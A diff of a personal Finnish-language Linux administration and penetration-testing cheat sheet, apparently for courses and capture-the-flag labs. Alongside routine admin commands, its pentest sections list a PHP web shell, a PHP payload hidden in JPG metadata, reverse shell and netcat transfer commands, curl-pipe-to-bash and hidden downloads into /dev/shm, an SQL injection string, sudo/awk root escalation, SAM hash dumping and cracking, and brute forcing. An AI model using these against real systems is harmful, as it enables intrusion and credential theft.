@@ -19,13 +19,16 @@ ________________________________________________________________________________
 iwconfig					<--->	Tietoja langatomasta adapterista	
 sudo apt-get install bcmwl-kernel-source	<--->	Lataa langatoman adapterin
 
+Editoi /etc/pulse/daemon.conf no -> yes		<--->	Kali Linuxiin aanet
+systemctl --user enable pulseaudio		<--->   Kali Linuxiin aanet
+systemctl --user start pulseaudio		<--->   Kali Linuxiin aanet
+
 ________________________________________________________________________________________________________________________________
 *** KANSIOT LINUXIIN ***
 ls			<--->	Listaa nykyisen hakemiston tiedostot
 ls -a			<--->	Listaa myos hidden folderit all toiminolla
 ls -l			<--->	Nayttaa tiedostojen oikeudet
 pwd			<--->	Listaa taman hetkisen hakemiston "print working directory"
-exiftool		<--->	libimage-exiftool-perl kertoo tiedoton luonti ajan ja muita tietoja
 du -h foldename/	<--->	listaa paljon kansio vie tilaa
 
 mkdir kansionnimi	<--->	Luo kansion
@@ -40,10 +43,10 @@ TAB			<--->	TAB automaattisesti tayttaa kansioita valitaessa
 chmod ugo+rwx		<--->	Read write ja execute oikeus. user group ja other kayttajille
 mv oldname newname	<--->	Vaihtaa tiedoston nimen
 rm tiedosto		<--->	Poistaa tiedoston
-rm -r kansio		<--->	Poistaa kansion
+rm -r kansio		<--->	Poistaa kansion rekursiivisesti
 mv tiedostonnimi kansio/<--->	Vie tiedoston toiseen kansioon
 cp tiedostonnimi kansio/<--->	Kopioi tiedoston toiseen kansioon
-cp -rp			<--->	RP lipuilla kopioidaan myos tiedoston oikeudet
+cp -rp			<--->	RP lipuilla kopioidaan myos tiedoston oikeudet recursiivisesti
 
 /etc			<--->	kaikkien ohjelmien asetuksien kansio
 /var/log/auth.log	<--->	Kirjautumis loki tiedosto
@@ -70,6 +73,20 @@ find /home -printf "%f\t%p\t%u\t%g\m\n" | column -t	<--->	Hakee home kansion kai
 find / -group adm -ls 2>/dev/null			<--->	Ryhma oikeuksien haku
 find / -user joni -ls 2>/dev/null			<--->	Tiedostojen user oikeuksien haku
 find ./ | grep '.exe'					<--->	Etsii kansiotai eteenpain exe tiedostoja
+
+________________________________________________________________________________________________________________________________
+*** Metadata ***
+exiftool                <--->   libimage-exiftool-perl kertoo tiedoton luonti ajan ja muita tietoja
+
+patterns.dunttus.com kuvien metadata bashilla:
+exiftool -by-line="[Joni Hakala]" -CopyrightNotice="© [Joni Hakala] ; \
+Licence: Creative Commons Zero v1.0 Universal \
+(https://creativecommons.org/publicdomain/zero/1.0/)" \
+-artist="[Joni Hakala]" -Copyright="© [Joni Hakala] ; \
+Licence: Creative Commons Zero v1.0 Universal \
+(https://creativecommons.org/publicdomain/zero/1.0/)" \
+dunttus_patterns*
+
 ________________________________________________________________________________________________________________________________
 *** ASENNUKSET ***
 sudo apt-get update			<--->	Paivittaa palvelimelle ohejelmitojen versio tiedot
@@ -78,7 +95,7 @@ sudo apt-get dist-upgrade		<--->	Kernel paivitykset
 sudo apt autoremove			<--->	Poistaa paketit turhat paketit
 sudo reboot				<--->	Uudelleen kaynnistys
 
-UBUNTU
+UBUNTU 19->20
 apt-get dist-upgrade                    <--->   Kernel paivitykset
 cat /etc/lsb-release			<--->	Linux version tarkastus 
 uname -mrs				<--->	Kernel version tarkastus
@@ -96,8 +113,6 @@ apt-get update				<--->	Paivitaa versiot
 apt-get dist-upgrade			<--->	Asentaa buster paketit muista varmuuskopiot
 apt --purge autoremove			<--->	Poistaa vanhat paketit
 reboot					<--->	Kaynnista uudestaan
-
-
 
 apt-cache search ohjelmannimi		<--->	Etsii ohjelmistoja
 apt-get install ohjelmannimi		<--->	Asentaa ohjelmiston
@@ -127,6 +142,7 @@ sudo ufw allow 22/tcp				<--->	Ssh default portti auki
 sudo ufw allow 80/tcp				<--->	Apachen default portti auki
 sudo ufw deny 22/tcp				<--->	Ssh default portin sulkeminen
 sudo ufw status vebose				<--->	Tulimuurin status ja verbose luottavassa muodossa
+sudo systemctl restart ufw			<--->	Uudet ufw asetukset menee paalle restartilla
 
 nc -vz ip portti                                <--->   Yhden portin scannaus netcatilla
 netstat -tulpn					<--->   Avoimet portit
@@ -184,10 +200,9 @@ ________________________________________________________________________________
 *** JULKINEN JA SALAINEN AVAIN ***
 ssh-keygen					<--->	Luo julkisen ja salaisen avaimen
 ssh-copy-id joni@localhost			<--->	Kopioi local hostiin avaimen
-ssh joni@ip -i id_rsa				<--->	Avain tiedostolla kirjautuminen
 
-Enter file in which to save the key (/home/user/.ssh/id_rsa):	<--->	Salainen avain
-rsa.pub julkinen avain						<--->	Julkinen avain
+to save the key (/home/user/.ssh/id_rsa):	<--->	Salainen avain
+rsa.pub julkinen avain				<--->	Julkinen avain
 
 ________________________________________________________________________________________________________________________________
 *** TIEDONSIIRTO ***
@@ -453,7 +468,6 @@ sudo salt 'orja' pkg.purge firefox                      <--->   Paketin remote p
 
 sudo salt -G 'os:windows' pkg.refresh_db                <--->   Salt komento joka kohdennettu windows os
 
-scp -P 2020 -r "tiedosto" joni@ip_address:/home/joni	<---> Tiedon siirto Windows feature bashilta portiin 2020
 
 SOURCES:
 Pohjana Tero Karvinen 2012: Palvelinten hallinta kurssi, http://terokarvinen.com
@@ -620,8 +634,9 @@ shift+a                                         <--->   Intercept tilassa pääs
 
 ________________________________________________________________________________________________________________________________
 ** Gobuster **
-gobuster dir -u http://URL -w /usr/share/wordlist	<--->	Dir skannaus
-
+gobuster dir -u http://URL -w /usr/share/word		<--->	Dir skannaus
+gobuster dir -u http://URL -w /usr/share/word -x .php	<--->	php paate etsinta
+ 
 ________________________________________________________________________________________________________________________________
 ** DIRB skanneri **
 dirb http://10.10.10.1 -r -o                    <--->   -r lippu no recursive ja -o tallentaa listan
@@ -744,7 +759,7 @@ s                                                                               
 
 ________________________________________________________________________________________________________________________________
 ** THCHydra **
-cewl -w -w savefile.txt	-d 3 -m 5 http://10.10.10.10/people/	<--->	Sanalistan luonti min 5 kirjain ja 3sivua alueesta
+cewl -w savefile.txt -d 3 -m 5 http://10.10.10.10/people/	<--->	Sanalistan luonti min 5 kirjain ja 3sivua alueesta
 
 hydra -l user -P sanalista 10.10.10.10 -t 4 ssh -V              <--->   SSH:n kautta yrittää aravata tietyn käyytäjän salasanaa
 hydra -L loginuserfile                                          <--->   Kokeilee kaikilla käyttäjillä jotka sanalistassa
@@ -775,21 +790,27 @@ fg					<--->
 
 ________________________________________________________________________________________________________________________________
 ** Reverse shell **
-<?php echo system($_REQUEST['fun']); ?>				<--->	Koodin toimivuus testi
-?fun=whoami							<--->	Selaimessa tiedoston peraan
+<?php echo system($_REQUEST['fun']); ?>						<--->	Koodin toimivuus testi
+?fun=whoami									<--->	Selaimessa tiedoston peraan
 
-python -m SimpleHTTPServer 9911					<--->   Lataus serveri
-wget 10.10.10.10:9911/filename.php -O /dev/shm/.name.php	<--->   Tiedoston lataus selaimella
-nc -vnlp 5005							<--->	Reverse shell pyynto omalle koneelle
+python -m SimpleHTTPServer 9911							<--->   Lataus serveri
+wget 10.10.10.10:9911/filename.php -O /dev/shm/.name.php			<--->   Tiedoston lataus selaimella
+nc -vnlp 5553									<--->	Reverse shell pyynto omalle koneelle
 
-python3 -c 'import pty;pty.spawn("/bin/bash")'			<--->	tty shell
-python -m 'import pty;pty.spawn("/bin/bash")'			<--->	tty shell vanha versio
-CTRL+Z								<--->	Vie taustalle
-stty -a								<--->	Tab mod paalle
-stty raw -echo							<--->	Tab auto comp paalle
-fg								<--->	Ohjelma taustalta takaisin
-stty rows 49							<--->	49 tty riveja
-stty cols 185							<--->	185 tty kolumneja
+python3 -c 'import pty;pty.spawn("/bin/bash")'					<--->	tty shell
+python -m 'import pty;pty.spawn("/bin/bash")'					<--->	tty shell vanha versio
+CTRL+Z										<--->	Vie taustalle
+stty -a										<--->	Tab mod paalle
+stty raw -echo									<--->	Ajetaan echon kautta omalta koneelta
+fg										<--->	Ohjelma taustalta takaisin
+stty rows 49									<--->	49 tty riveja
+stty cols 185									<--->	185 tty kolumneja
+
+nc -vlp 5553 > testfile.txt                                                     <--->   Tiedoston lataus netcatilla
+nc 10.10.10.10 5333 < downloadfile.txt                                          <--->   Tiedoston vienti toiselle koneelle nclla
+
+exiftool -Comment='<?php echo "<pre>"; system($_GET['fun']); ?>' silver.jpg	<--->	JPG kuva php funktiolla
+mv silver.php.jpg								<--->	Nimen vaihto .php.jpg tiedostoksi
 
 ________________________________________________________________________________________________________________________________
 ** PrivEsc **
@@ -800,26 +821,29 @@ pspy64s								<--->	CRON job scanneri
 python -m SimpleHTTPServer 9911                                 <--->   Lataus serveri
 curl 10.10.10.10/LinEnum/LinEnum.sh | bash			<--->	Python http palvelimelta suoraan portti 80
 wget 10.10.10.10:9911/linenum.sh -O /dev/shm/.linenum.sh	<--->	wget linenum simplepython palvelimesta
-wget 10.10.10.10:9911/winpeas.exe -O ./				<--->	wget winpeas nykyiseen kansioon
+wget 10.10.10.10:9911/winpeas.exe -O ./winpeas.exe		<--->	wget winpeas nykyiseen kansioon
 
-SUID								<--->	root kayttajalla ajettavia ohjelmia
+SUID
+find / -perm /4000 2>/dev/null					<--->	Etsii set uid tiedostoja kaikki ohjelmat 
+rwsr-sr-x 1 root root						<--->	Voidaan vaihtaa id root kayttajaan ja ajaa. term punainen
 
 cat /proc/net/tcp						<--->	Nayttaa portit joita palvelin kuuntelee
 int(0x0016)							<--->	Python tulkilla portit oikeaan muotton esim 22ssh = 0016
-________________________________________________________________________________________________________________________________
-** privesc **
-sudo -u root /kansio/tiedosto		<--->	Sudo oikeus ilman salasanaa ajetaan toisella kayttajalla
-uname -a				<--->   Linux versio komento
-ps aux | grep root			<--->   root oikeuden ohjelmien haku
-sudo -l					<--->	Sudotus oikeudet
-sudo -u user bash			<--->	Sudo toisella kayttajalla
-sudo su					<--->	Super User kirjautuminen
-sudo awk 'BEGIN {system("/bin/sh")}'	<--->	Root user awklla
-find / -perm -4000 2>/dev/null		<--->	Etsii tiedostoja 4000 oikeudella
-openssl passwd -h			<--->	Salasanan luonti passwd tiedostoon helpistä salasana parametrit
+
+getent group							<--->	Kayttajien ryhmat groups
+sudo -u root /kansio/tiedosto					<--->	Sudo oikeus ilman salasanaa ajetaan toisella kayttajalla
+uname -a							<--->   Linux versio komento
+ps aux | grep root						<--->   root oikeuden ohjelmien haku
+sudo -l								<--->	Sudotus oikeudet
+sudo -u user bash						<--->	Sudo toisella kayttajalla
+sudo su								<--->	Super User kirjautuminen
+sudo awk 'BEGIN {system("/bin/sh")}'				<--->	Root user awklla
+find / -perm -4000 2>/dev/null					<--->	Etsii tiedostoja 4000 oikeudella
+openssl passwd -h						<--->	Salasanan luonti passwd tiedostoon helpistä salasana parametrit
 
 ________________________________________________________________________________________________________________________________
-** WpScan **
+** VirtualhostScan **
+wfuzz -H "Host: FUZZ.htb" -w ./wordlist -u http://10.10.10.10/		<--->	Hakee virtualhostia .htb alueesta
 wpscan --url http://localhost --enumerate u,ap,tt,t | tee teksti.txt	<--->	Scanneri wordpress sivuille
 
 ________________________________________________________________________________________________________________________________
@@ -828,7 +852,12 @@ Port:8080			<--->	Proxyyn portti
 CTRL+r				<--->	Intersept lähetetään Repeaterille
 CTRL+u				<--->	URL encoding jos omat komennot ei toimi
 CTRL+SHIFT+u			<--->	URL decode jotta saadaan luettavaan muotoon takaisin
-tcpdump -i tun0			<--->	Takaisin pain pingaukseen
+sudo tcpdump -i tun0 icmp	<--->	Takaisin pain pingaukseen
+
+________________________________________________________________________________________________________________________________
+** SQL **
+username=admin' or 1+1--+	<--->	Perus injectio testi ' jalkeen
+sqlmap				<--->	Kali ohjelma Sql injektio testaukseen
 
 ________________________________________________________________________________________________________________________________
 ** VIM **
@@ -858,7 +887,7 @@ systeminfo					<--->	Powershell komento joka antaa tietoja jarjestelmasta
 /Windows/System32/config/SAM			<--->	Salasana tiedosto windowsille
 pwdump SYSTEM SAM > /kansio/.txt		<--->	Dumpaa salasa hashit luottavaan muotoon
 hashcat -v -m 1000 windowshash rockyou.txt	<--->	SAM hash crackaus
-
+evil-winrm -u user -p password -i 10.10.10.10	<--->	Evil-winrm github: remote Linux --> Windows
 
 !!! Penetration Testing kohdan kaytetyt menetelmat ovat vaarin kaytettyna laittomia, kayta omalla vastuulla. !!!
 ________________________________________________________________________________________________________________________________
